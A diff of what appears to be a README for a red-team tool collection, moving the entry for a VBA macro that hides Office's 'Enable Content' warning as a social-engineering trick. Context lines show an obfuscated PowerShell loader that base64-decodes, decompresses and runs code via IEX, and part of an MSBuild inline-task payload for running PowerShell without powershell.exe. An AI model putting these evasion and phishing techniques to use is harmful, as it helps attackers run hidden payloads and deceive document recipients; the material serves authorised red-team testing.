@@ -14,6 +14,8 @@ $s = New-Object IO.MemoryStream(, [Convert]::FromBase64String('H4sIAMkfcloC/3u/e
 IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s, [IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
 ```
 
+- **`delete-warning-div-macro.vbs`** - VBA Macro function to be used as a Social Engineering trick removing "Enable Content" warning message as the topmost floating text box with given name. ([gist](https://gist.github.com/mgeeky/9cb6acdec31c8a70cc037c84c77a359c))
+
 - **`generateMSBuildPowershellXML.py`** - Powershell via MSBuild inline-task XML payload generation script - To be used during Red-Team assignments to launch Powershell payloads without using `powershell.exe` ([gist](https://gist.github.com/mgeeky/df9f313cfe468e56c59268b958319bcb))
 
     Example output **not minimized**:
@@ -100,8 +102,6 @@ kVG9FbmQoKTs=");string d=System.Text.Encoding.UTF8.GetString(x);Runspace     r=R
 ngTask></Project>                                                                                                     
 ------------------------------------------------------------------------------------                              
 ```
-
-- **`delete-warning-div-macro.vbs`** - VBA Macro function to be used as a Social Engineering trick removing "Enable Content" warning message as the topmost floating text box with given name. ([gist](https://gist.github.com/mgeeky/9cb6acdec31c8a70cc037c84c77a359c))
 
 - **`Invoke-Command-Cred-Example.ps1`** - Example of using PSRemoting with credentials passed directly from command line. ([gist](https://gist.github.com/mgeeky/de4ecf952ddce774d241b85cfbf97faf))
 
